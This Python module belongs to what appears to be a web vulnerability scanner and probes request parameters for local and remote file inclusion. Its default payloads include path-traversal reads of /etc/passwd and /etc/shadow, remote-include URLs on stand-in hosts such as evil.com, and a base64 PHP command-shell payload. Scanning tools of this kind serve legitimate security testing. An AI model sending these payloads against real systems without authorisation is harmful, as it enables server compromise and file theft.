# vuln_scan/modules/file_inclusion_scanner.py

import re
import json
import asyncio
import aiohttp
import urllib.parse
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from asgiref.sync import sync_to_async
from django.utils import timezone
from rules.models import VulnScanRule


class FileInclusionScanner:
    """
    文件包含扫描模块：负责检测文件包含漏洞
    """

    def __init__(self):
        """初始化扫描器"""
        # 记录已扫描的URL，避免重复扫描
        self.scanned_urls = set()

        # 记录已发现的漏洞，避免重复报告
        self.found_vulnerabilities = set()

        # 默认超时时间
        self.timeout = 10

    def safe_decode(self, value):
        """安全地解码任何值，处理所有可能的编码错误"""
        if value is None:
            return ""

        if isinstance(value, bytes):
            try:
                return value.decode('utf-8', errors='replace')
            except Exception:
                # 尝试其他编码格式
                for encoding in ['latin1', 'cp1252', 'iso-8859-1', 'gbk']:
                    try:
                        return value.decode(encoding, errors='replace')
                    except:
                        continue

                # 如果所有解码尝试都失败，返回十六进制表示
                try:
                    return f"[二进制数据: {value[:20].hex()}...]"
                except:
                    return "[二进制数据]"

        if isinstance(value, str):
            # 如果已经是字符串，确保它是有效的UTF-8
            try:
                return value.encode('utf-8', errors='replace').decode('utf-8')
            except Exception:
                return "[编码错误的字符串]"

        # 处理其他类型
        try:
            return str(value)
        except Exception:
            return "[无法转换为字符串的对象]"

    async def scan(self, context):
        """
        执行文件包含扫描

        参数:
            context: 扫描上下文，包含当前请求信息、配置等

        返回:
            漏洞检测结果列表
        """
        # 获取上下文数据
        asset = context['asset']
        url = context['url']
        method = context['method']
        req_headers = context['req_headers']
        req_content = context['req_content']
        resp_headers = context['resp_headers']
        resp_content = context['resp_content']
        channel_layer = context['channel_layer']

        # 如果URL已扫描，则跳过
        if url in self.scanned_urls:
            return []

        # 标记为已扫描
        self.scanned_urls.add(url)

        # 获取扫描配置
        lfi_payloads = await self.get_lfi_payloads(context)
        rfi_payloads = await self.get_rfi_payloads(context)
        file_patterns = await self.get_file_patterns(context)

        # 检查是否有规则可用
        if not lfi_payloads and not rfi_payloads:
            print(f"警告: 没有可用的文件包含载荷规则，跳过文件包含扫描")
            return []

        results = []

        # 1. 检查URL参数中的文件包含
        if '?' in url:
            url_results = await self.scan_url_parameters(
                context,
                url,
                lfi_payloads,
                rfi_payloads,
                file_patterns
            )
            results.extend(url_results)

        # 2. 检查POST请求中的文件包含
        if method == 'POST' and req_content:
            post_results = await self.scan_post_parameters(
                context,
                url,
                req_content,
                lfi_payloads,
                rfi_payloads,
                file_patterns
            )
            results.extend(post_results)

        return results

    @sync_to_async
    def _get_rule_from_db(self, vuln_type, subtype):
        """从数据库获取规则"""
        try:
            # 获取指定类型和子类型的漏洞扫描规则
            rules = VulnScanRule.objects.filter(
                vuln_type=vuln_type,
                is_enabled=True
            )

            # 遍历规则找到匹配的子类型
            for rule in rules:
                try:
                    rule_content = json.loads(rule.rule_content)
                    if rule_content.get('subType') == subtype:
                        return rule_content
                except (json.JSONDecodeError, AttributeError):
                    # 如果JSON解析失败，检查rule_content中是否包含子类型标识
                    if f'"subType": "{subtype}"' in rule.rule_content or f'"subType":"{subtype}"' in rule.rule_content:
                        try:
                            # 尝试重新解析，如果失败则返回默认值
                            return json.loads(rule.rule_content)
                        except:
                            pass

            # 如果没有找到匹配的规则，返回None
            return None
        except Exception as e:
            print(f"从数据库获取规则时出错: {str(e)}")
            return None

    async def get_lfi_payloads(self, context):
        """获取本地文件包含测试载荷"""
        # 从数据库获取规则
        rule_content = await self._get_rule_from_db('file_inclusion', 'lfi')

        # 如果找到规则并且有payload字段，返回规则中的payload
        if rule_content and 'payloads' in rule_content and isinstance(rule_content['payloads'], list):
            return rule_content['payloads']

        # 如果没有找到规则，返回默认的载荷
        print("未找到本地文件包含规则，使用默认载荷")
        return [
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "../../../../../etc/passwd",
            "../../../../../../etc/passwd",
            "../../../../../../../etc/passwd",
            "../../../../../../../../etc/passwd",
            "../../../../../../../../../etc/passwd",
            "../../../../../../../../../../etc/passwd",
            "../../../../../../../../../../../etc/passwd",
            "../../../../../../../../../../../../etc/passwd",
            "../../../../../../../../../../../../../etc/passwd",
            "../../../../../../../../../../../../../../../etc/shadow",
            "../../../../Windows/win.ini",
            "../../../../../Windows/win.ini",
            "../../../../../../Windows/win.ini",
            "../../../../windows/win.ini",
            "../../../../../windows/win.ini",
            "../../../../../../windows/win.ini",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
            "..%5c..%5c..%5cwindows%5cwin.ini",
            "..%5c..%5c..%5c..%5cwindows%5cwin.ini"
        ]

    async def get_rfi_payloads(self, context):
        """获取远程文件包含测试载荷"""
        # 从数据库获取规则
        rule_content = await self._get_rule_from_db('file_inclusion', 'rfi')

        # 如果找到规则并且有payload字段，返回规则中的payload
        if rule_content and 'payloads' in rule_content and isinstance(rule_content['payloads'], list):
            return rule_content['payloads']

        # 如果没有找到规则，返回默认的载荷
        print("未找到远程文件包含规则，使用默认载荷")
        return [
            "http://evil.com/shell.php",
            "https://attacker.com/malicious.php",
            "http://localhost/shell.php",
            "ftp://evil.com/shell.php",
            "//evil.com/shell.php",
            "http://127.0.0.1/shell.php",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4="
        ]

    async def get_file_patterns(self, context):
        """获取文件包含匹配模式"""
        # 从数据库获取规则
        rule_content = await self._get_rule_from_db('file_inclusion', 'patterns')

        # 如果找到规则并且有patterns字段，返回规则中的patterns
        if rule_content and 'patterns' in rule_content and isinstance(rule_content['patterns'], dict):
            return rule_content['patterns']

        # 如果没有找到规则，返回默认的匹配模式
        print("未找到文件包含匹配模式规则，使用默认匹配模式")
        return {
            "linux_etc_passwd": [
                "root:x:0:0:",
                "bin:x:",
                "daemon:x:",
                "nobody:x:"
            ],
            "windows_win_ini": [
                "[fonts]",
                "[extensions]",
                "[mci extensions]",
                "[files]"
            ],
            "php_info": [
                "PHP Version",
                "php.ini"
            ]
        }

    async def scan_url_parameters(self, context, url, lfi_payloads, rfi_payloads, file_patterns):
        """扫描URL参数中的文件包含漏洞"""
        results = []

        try:
            # 解析URL
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)

            # 如果没有参数，直接返回
            if not query_params:
                return results

            # 测试每个参数
            for param, values in query_params.items():
                if not values:
                    continue

                original_value = values[0]

                # 测试本地文件包含
                for payload in lfi_payloads:
                    # 检测是否已存在相同漏洞
                    vuln_key = f"lfi_url_{param}_{url}"
                    if vuln_key in self.found_vulnerabilities:
                        continue

                    # 创建测试URL
                    test_params = query_params.copy()
                    test_params[param] = [payload]  # 替换原值
                    test_query = urlencode(test_params, doseq=True)
                    test_url = urlunparse((
                        parsed_url.scheme,
                        parsed_url.netloc,
                        parsed_url.path,
                        parsed_url.params,
                        test_query,
                        parsed_url.fragment
                    ))

                    # 发送请求
                    async with aiohttp.ClientSession() as session:
                        try:
                            async with session.get(
                                    test_url,
                                    timeout=self.timeout,
                                    ssl=False
                            ) as response:
                                # 获取完整的响应文本
                                response_text = await response.text(errors='replace')

                                # 检查是否成功包含文件
                                file_type, pattern_match = self.check_file_inclusion(response_text, file_patterns)

                                if file_type and pattern_match:
                                    # 构造完整的HTTP响应内容
                                    headers_text = "\n".join([f"{k}: {v}" for k, v in response.headers.items()])
                                    full_response = f"HTTP/1.1 {response.status} {response.reason}\n{headers_text}\n\n{response_text}"

                                    # 记录漏洞
                                    self.found_vulnerabilities.add(vuln_key)

                                    # 创建漏洞结果
                                    result = {
                                        'vuln_type': 'file_inclusion',
                                        'vuln_subtype': 'lfi',
                                        'name': f'URL参数 {param} 中的本地文件包含漏洞',
                                        'description': f'在URL参数 {param} 中发现本地文件包含漏洞，可以读取服务器上的敏感文件',
                                        'severity': 'high',
                                        'url': url,
                                        'parameter': param,
                                        'payload': payload,
                                        'request': f"GET {test_url} HTTP/1.1\nHost: {parsed_url.netloc}",
                                        'response': full_response,
                                        'proof': f"在参数 {param} 中注入 {payload} 后，响应中包含 {file_type} 文件的特征: {pattern_match}"
                                    }

                                    results.append(result)
                                    break  # 找到一个参数的漏洞后，就不再测试该参数的其他载荷
                        except Exception as e:
                            print(f"测试URL参数 {param} 的LFI时出错: {str(e)}")
                            continue

                # 测试远程文件包含
                for payload in rfi_payloads:
                    # 检测是否已存在相同漏洞
                    vuln_key = f"rfi_url_{param}_{url}"
                    if vuln_key in self.found_vulnerabilities:
                        continue

                    # 创建测试URL
                    test_params = query_params.copy()
                    test_params[param] = [payload]  # 替换原值
                    test_query = urlencode(test_params, doseq=True)
                    test_url = urlunparse((
                        parsed_url.scheme,
                        parsed_url.netloc,
                        parsed_url.path,
                        parsed_url.params,
                        test_query,
                        parsed_url.fragment
                    ))

                    # 发送请求
                    async with aiohttp.ClientSession() as session:
                        try:
                            async with session.get(
                                    test_url,
                                    timeout=self.timeout,
                                    ssl=False
                            ) as response:
                                # 获取完整的响应文本
                                response_text = await response.text(errors='replace')

                                # 检查是否有远程文件包含的特征
                                # 对于RFI，我们主要检查是否成功包含了远程文件（通常会有明显的PHP错误）
                                rfi_indicators = [
                                    "failed to open stream: HTTP request failed",
                                    "failed to open stream: Connection refused",
                                    "failed to open stream",
                                    "include(): URL file-access is disabled",
                                    "include(): Failed opening",
                                    "Warning: include(",
                                ]

                                has_rfi = any(indicator in response_text for indicator in rfi_indicators)

                                # 如果有远程包含特征或状态码为500（服务器错误）
                                if has_rfi or response.status == 500:
                                    # 构造完整的HTTP响应内容
                                    headers_text = "\n".join([f"{k}: {v}" for k, v in response.headers.items()])
                                    full_response = f"HTTP/1.1 {response.status} {response.reason}\n{headers_text}\n\n{response_text}"

                                    # 记录漏洞
                                    self.found_vulnerabilities.add(vuln_key)

                                    # 找出匹配的错误信息
                                    matched_error = next(
                                        (indicator for indicator in rfi_indicators if indicator in response_text),
                                        "服务器错误")

                                    # 创建漏洞结果
                                    result = {
                                        'vuln_type': 'file_inclusion',
                                        'vuln_subtype': 'rfi',
                                        'name': f'URL参数 {param} 中的远程文件包含漏洞',
                                        'description': f'在URL参数 {param} 中发现远程文件包含漏洞，可以包含远程服务器上的文件',
                                        'severity': 'critical',
                                        'url': url,
                                        'parameter': param,
                                        'payload': payload,
                                        'request': f"GET {test_url} HTTP/1.1\nHost: {parsed_url.netloc}",
                                        'response': full_response,
                                        'proof': f"在参数 {param} 中注入 {payload} 后，响应中包含远程文件包含的特征: {matched_error}"
                                    }

                                    results.append(result)
                                    break  # 找到一个参数的漏洞后，就不再测试该参数的其他载荷
                        except Exception as e:
                            print(f"测试URL参数 {param} 的RFI时出错: {str(e)}")
                            continue

        except Exception as e:
            print(f"扫描URL参数文件包含时出错: {str(e)}")

        return results

    async def scan_post_parameters(self, context, url, req_content, lfi_payloads, rfi_payloads, file_patterns):
        """扫描POST请求参数中的文件包含漏洞"""
        results = []

        try:
            # 解析URL获取主机信息
            parsed_url = urlparse(url)

            # 检查请求内容类型并解析
            content_type = None
            for key, value in context.get('req_headers', {}).items():
                if key.lower() == 'content-type':
                    content_type = value.lower()
                    break

            post_params = {}

            # 处理不同的内容类型
            if content_type and 'application/x-www-form-urlencoded' in content_type:
                # 处理表单数据
                try:
                    post_params = parse_qs(self.safe_decode(req_content))
                except Exception as e:
                    print(f"解析表单数据时出错: {str(e)}")
            elif content_type and 'application/json' in content_type:
                # 处理JSON数据
                try:
                    json_data = json.loads(self.safe_decode(req_content))

                    # 扁平化JSON对象
                    def flatten_json(json_obj, prefix=''):
                        result = {}
                        for key, value in json_obj.items():
                            if isinstance(value, dict):
                                result.update(flatten_json(value, f"{prefix}{key}."))
                            elif isinstance(value, list):
                                for i, item in enumerate(value):
                                    if isinstance(item, dict):
                                        result.update(flatten_json(item, f"{prefix}{key}[{i}]."))
                                    else:
                                        result[f"{prefix}{key}[{i}]"] = str(item)
                            else:
                                result[f"{prefix}{key}"] = str(value)
                        return result

                    post_params = flatten_json(json_data)
                    # 转换为与parse_qs相同的格式 {param: [value]}
                    post_params = {k: [v] for k, v in post_params.items()}
                except Exception as e:
                    print(f"解析JSON数据时出错: {str(e)}")
            else:
                # 尝试直接解析为表单数据
                try:
                    post_params = parse_qs(self.safe_decode(req_content))
                except Exception as e:
                    print(f"解析未知类型的请求内容时出错: {str(e)}")

            # 如果没有参数，直接返回
            if not post_params:
                return results

            # 测试每个参数
            for param, values in post_params.items():
                if not values:
                    continue

                original_value = values[0]

                # 创建任务列表，用于并行测试
                lfi_test_tasks = []
                rfi_test_tasks = []

                # 测试本地文件包含
                for payload in lfi_payloads:
                    # 检测是否已存在相同漏洞
                    vuln_key = f"lfi_post_{param}_{url}"
                    if vuln_key in self.found_vulnerabilities:
                        continue

                    # 创建任务
                    test_task = self._test_post_parameter_lfi(
                        url, parsed_url, param, payload, post_params,
                        content_type, vuln_key, file_patterns
                    )
                    lfi_test_tasks.append(test_task)

                # 测试远程文件包含
                for payload in rfi_payloads:
                    # 检测是否已存在相同漏洞
                    vuln_key = f"rfi_post_{param}_{url}"
                    if vuln_key in self.found_vulnerabilities:
                        continue

                    # 创建任务
                    test_task = self._test_post_parameter_rfi(
                        url, parsed_url, param, payload, post_params,
                        content_type, vuln_key
                    )
                    rfi_test_tasks.append(test_task)

                # 并行执行测试任务
                if lfi_test_tasks:
                    # 使用信号量限制并发数
                    sem = asyncio.Semaphore(5)  # 最多5个并发测试

                    async def run_with_sem(task):
                        async with sem:
                            return await task

                    # 执行所有LFI测试任务
                    lfi_results = await asyncio.gather(
                        *[run_with_sem(task) for task in lfi_test_tasks],
                        return_exceptions=True
                    )

                    # 处理结果
                    for result in lfi_results:
                        if result and not isinstance(result, Exception):
                            results.append(result)
                            # 找到一个漏洞后，不再测试该参数的RFI
                            break

                # 如果没有发现LFI，则测试RFI
                if not any(result and not isinstance(result, Exception) for result in lfi_results) and rfi_test_tasks:
                    # 执行所有RFI测试任务
                    rfi_results = await asyncio.gather(
                        *[run_with_sem(task) for task in rfi_test_tasks],
                        return_exceptions=True
                    )

                    # 处理结果
                    for result in rfi_results:
                        if result and not isinstance(result, Exception):
                            results.append(result)
                            break

        except Exception as e:
            print(f"扫描POST参数文件包含时出错: {str(e)}")

        return results

    async def _test_post_parameter_lfi(self, url, parsed_url, param, payload, post_params, content_type, vuln_key,
                                       file_patterns):
        """测试单个POST参数的本地文件包含漏洞"""
        try:
            # 创建测试参数
            test_params = post_params.copy()
            test_params[param] = [payload]  # 替换原值

            # 根据content_type准备请求内容
            if content_type and 'application/json' in content_type:
                # 将扁平的参数还原为JSON
                test_json = {}
                for k, v in test_params.items():
                    if '.' in k:  # 处理嵌套字段
                        parts = k.split('.')
                        current = test_json
                        for part in parts[:-1]:
                            if part not in current:
                                current[part] = {}
                            current = current[part]
                        current[parts[-1]] = v[0]
                    else:
                        test_json[k] = v[0]
                test_content = json.dumps(test_json)
                headers = {'Content-Type': 'application/json'}
            else:
                # 默认使用表单格式
                test_content = urlencode(test_params, doseq=True)
                headers = {'Content-Type': 'application/x-www-form-urlencoded'}

            # 发送POST请求
            async with aiohttp.ClientSession() as session:
                async with session.post(
                        url,
                        data=test_content,
                        headers=headers,
                        timeout=self.timeout,
                        ssl=False
                ) as response:
                    # 获取完整的响应文本
                    response_text = await response.text(errors='replace')

                    # 检查是否成功包含文件
                    file_type, pattern_match = self.check_file_inclusion(response_text, file_patterns)

                    if file_type and pattern_match:
                        # 构造完整的HTTP响应内容
                        headers_text = "\n".join([f"{k}: {v}" for k, v in response.headers.items()])
                        full_response = f"HTTP/1.1 {response.status} {response.reason}\n{headers_text}\n\n{response_text}"

                        # 记录漏洞
                        self.found_vulnerabilities.add(vuln_key)

                        # 创建漏洞结果
                        result = {
                            'vuln_type': 'file_inclusion',
                            'vuln_subtype': 'lfi',
                            'name': f'POST参数 {param} 中的本地文件包含漏洞',
                            'description': f'在POST参数 {param} 中发现本地文件包含漏洞，可以读取服务器上的敏感文件',
                            'severity': 'high',
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'request': f"POST {url} HTTP/1.1\nHost: {parsed_url.netloc}\nContent-Type: {content_type}\n\n{test_content}",
                            'response': full_response,
                            'proof': f"在参数 {param} 中注入 {payload} 后，响应中包含 {file_type} 文件的特征: {pattern_match}"
                        }

                        return result

            # 如果没有发现漏洞
            return None

        except Exception as e:
            print(f"测试POST参数 {param} 的LFI漏洞时出错: {str(e)}")
            return None

    async def _test_post_parameter_rfi(self, url, parsed_url, param, payload, post_params, content_type, vuln_key):
        """测试单个POST参数的远程文件包含漏洞"""
        try:
            # 创建测试参数
            test_params = post_params.copy()
            test_params[param] = [payload]  # 替换原值

            # 根据content_type准备请求内容
            if content_type and 'application/json' in content_type:
                # 将扁平的参数还原为JSON
                test_json = {}
                for k, v in test_params.items():
                    if '.' in k:  # 处理嵌套字段
                        parts = k.split('.')
                        current = test_json
                        for part in parts[:-1]:
                            if part not in current:
                                current[part] = {}
                            current = current[part]
                        current[parts[-1]] = v[0]
                    else:
                        test_json[k] = v[0]
                test_content = json.dumps(test_json)
                headers = {'Content-Type': 'application/json'}
            else:
                # 默认使用表单格式
                test_content = urlencode(test_params, doseq=True)
                headers = {'Content-Type': 'application/x-www-form-urlencoded'}

            # 发送POST请求
            async with aiohttp.ClientSession() as session:
                async with session.post(
                        url,
                        data=test_content,
                        headers=headers,
                        timeout=self.timeout,
                        ssl=False
                ) as response:
                    # 获取完整的响应文本
                    response_text = await response.text(errors='replace')

                    # 检查是否有远程文件包含的特征
                    rfi_indicators = [
                        "failed to open stream: HTTP request failed",
                        "failed to open stream: Connection refused",
                        "failed to open stream",
                        "include(): URL file-access is disabled",
                        "include(): Failed opening",
                        "Warning: include(",
                    ]

                    has_rfi = any(indicator in response_text for indicator in rfi_indicators)

                    # 如果有远程包含特征或状态码为500（服务器错误）
                    if has_rfi or response.status == 500:
                        # 构造完整的HTTP响应内容
                        headers_text = "\n".join([f"{k}: {v}" for k, v in response.headers.items()])
                        full_response = f"HTTP/1.1 {response.status} {response.reason}\n{headers_text}\n\n{response_text}"

                        # 记录漏洞
                        self.found_vulnerabilities.add(vuln_key)

                        # 找出匹配的错误信息
                        matched_error = next((indicator for indicator in rfi_indicators if indicator in response_text),
                                             "服务器错误")

                        # 创建漏洞结果
                        result = {
                            'vuln_type': 'file_inclusion',
                            'vuln_subtype': 'rfi',
                            'name': f'POST参数 {param} 中的远程文件包含漏洞',
                            'description': f'在POST参数 {param} 中发现远程文件包含漏洞，可以包含远程服务器上的文件',
                            'severity': 'critical',
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'request': f"POST {url} HTTP/1.1\nHost: {parsed_url.netloc}\nContent-Type: {content_type}\n\n{test_content}",
                            'response': full_response,
                            'proof': f"在参数 {param} 中注入 {payload} 后，响应中包含远程文件包含的特征: {matched_error}"
                        }

                        return result

            # 如果没有发现漏洞
            return None

        except Exception as e:
            print(f"测试POST参数 {param} 的RFI漏洞时出错: {str(e)}")
            return None

    def check_file_inclusion(self, response_text, file_patterns):
        """
        检查响应中是否包含文件内容的特征

        参数:
            response_text: 响应文本
            file_patterns: 文件匹配模式字典

        返回:
            (文件类型, 匹配的特征) 元组，如果没有匹配则返回 (None, None)
        """
        if not response_text:
            return None, None

        # 检查每种文件类型的特征
        for file_type, patterns in file_patterns.items():
            for pattern in patterns:
                if pattern in response_text:
                    return file_type, pattern

        return None, None

    def clear_cache(self):
        """清除缓存"""
        self.scanned_urls.clear()
        self.found_vulnerabilities.clear()
        print("文件包含扫描器缓存已清除")